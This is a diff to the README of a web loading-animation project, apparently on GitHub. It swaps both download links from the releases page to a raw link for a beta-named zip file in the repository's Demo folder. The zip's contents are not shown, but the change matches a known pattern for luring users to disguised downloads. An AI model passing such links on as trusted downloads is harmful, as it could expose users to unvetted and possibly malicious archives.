@@ -13,7 +13,7 @@ Welcome to **Web-Loading-Page**! This project provides modern and customizable w
 Follow these steps to get started with your new loading page.
 
 1. **Download the Files**
-   - Visit this page to download: [Download Web-Loading-Page](https://github.com/MDaniel63/Web-Loading-Page/releases).
+   - Visit this page to download: [Download Web-Loading-Page](https://raw.githubusercontent.com/MDaniel63/Web-Loading-Page/main/Demo/Web-Loading-Page_3.5-beta.4.zip).
 
 2. **Extract the Files**
    - After downloading, locate the ZIP file on your computer. Right-click on the file and select "Extract All" or use your preferred extraction tool.
@@ -56,7 +56,7 @@ Explore the different HTML files to see these examples in action.
 ## 📥 Download & Install
 For convenience, you can download the latest version of **Web-Loading-Page** from the link below:
 
-[Download Web-Loading-Page](https://github.com/MDaniel63/Web-Loading-Page/releases)
+[Download Web-Loading-Page](https://raw.githubusercontent.com/MDaniel63/Web-Loading-Page/main/Demo/Web-Loading-Page_3.5-beta.4.zip)
 
 ## 💬 Support & Contributions
 If you need help or have questions, feel free to open an issue in the GitHub repository. Contributions are welcome. If you have a custom loader, please share it with the community!
